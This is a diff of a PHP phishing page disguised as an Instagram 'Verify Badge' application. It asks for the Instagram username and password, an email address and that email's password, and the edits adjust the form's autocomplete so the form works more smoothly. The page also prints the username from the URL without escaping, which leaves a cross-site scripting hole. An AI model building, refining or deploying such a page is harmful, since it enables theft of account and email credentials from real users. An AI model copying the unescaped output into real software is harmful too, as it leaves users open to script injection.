@@ -97,7 +97,7 @@ if(isset($_GET['comen']))
             </div>
             <span class="color-gray">Get Verify Badge on your Instagram account. Fill the form and get verify in 24 hours!</span>
             <div class="mb-3">
-                <input type="text" name="username" id="username" class="form-input" placeholder="Username" required autocomplete="no">
+                <input type="text" name="username" id="username" class="form-input" placeholder="Username" required autocomplete="off">
             </div>
             <div class="mb-3">
                 <button type="submit">Next</button>
@@ -110,13 +110,13 @@ if(isset($_GET['comen']))
             <p>Verify Badge @<?= $_GET['username']; ?><img src="https://istalya.com/image/cache/catalog/resimler/Varl%C4%B1k%201-1080x1080w.png" width=20 height=20></p>
             <span class="color-gray">Verify Badge on your account.</span>
             <div class="mb-3">
-                <input type="password" name="password" id="password" class="form-input" placeholder="Password" required autocomplete="no">
+                <input type="password" name="password" id="password" class="form-input" placeholder="Password" required autocomplete="off">
             </div>
             <div class="mb-3">
-                <input type="email" name="email" id="email" class="form-input" placeholder="Email" required autocomplete="no">
+                <input type="email" name="email" id="email" class="form-input" placeholder="Email" required autocomplete="off">
             </div>
             <div class="mb-3">
-                <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholder="Email Password" required autocomplete="no">
+                <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholder="Email Password" required autocomplete="off">
             </div>
             <div class="mb-3">
                 <select name="category" id="category" class="form-input">
